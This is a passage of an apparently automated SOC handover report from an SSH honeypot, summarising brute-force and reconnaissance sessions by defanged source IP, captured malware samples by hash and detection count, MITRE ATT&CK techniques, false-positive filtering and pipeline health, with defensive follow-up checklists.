| `2026-04-07 21:02:45` | `cowrie.client.kex` |
| `2026-04-07 21:02:45` | `cowrie.login.success` |
| `2026-04-07 21:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.29[.]174` to AbuseIPDB if not already reported
- [ ] Block `202.165.29[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `202.165.29[.]174` | **12** | 2026-04-07 20:43 | 2026-04-07 21:02 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.65.137[.]218` | **2** | 2026-04-07 21:52 | 2026-04-07 21:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.244.253[.]119` | 1 | 2026-04-07 21:19 | 2026-04-07 21:19 | 14s | 0 | `T1592` | 🟢 LOW |
| `47.237.29[.]129` | 1 | 2026-04-07 22:04 | 2026-04-07 22:04 | 30s | 0 | `T1592` | 🟢 LOW |
| `47.239.41[.]206` | 1 | 2026-04-07 21:06 | 2026-04-07 21:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.82.70[.]133` | 1 | 2026-04-07 22:22 | 2026-04-07 22:22 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `202.165.29[.]174` | MY | TM TECHNOLOGY SERVICES SDN. BHD. | **100** ⚠️ | 5 |
| `47.237.29[.]129` | SG | Alibaba Cloud LLC | **100** ⚠️ | 24 |
| `47.239.41[.]206` | HK | ALIBABA CLOUD - HK | **100** ⚠️ | 5 |
| `20.65.137[.]218` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `80.82.70[.]133` | NL | FiberXpress BV | **100** ⚠️ | 50 |
| `178.244.253[.]119` | TR | TURKCELL INTERNET | **96** ⚠️ | 6 |
| `117.207.39[.]133` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **46** | 0 |
| `23.239.13[.]54` | US | Linode | 4 | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 28 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 37 cases |
| Tool 34  | Credential Extractor        | ✅ 26 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (13.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 8 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 6 recon entry/entries in table (2 group(s) consolidating 14 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-07T22:36:43Z_
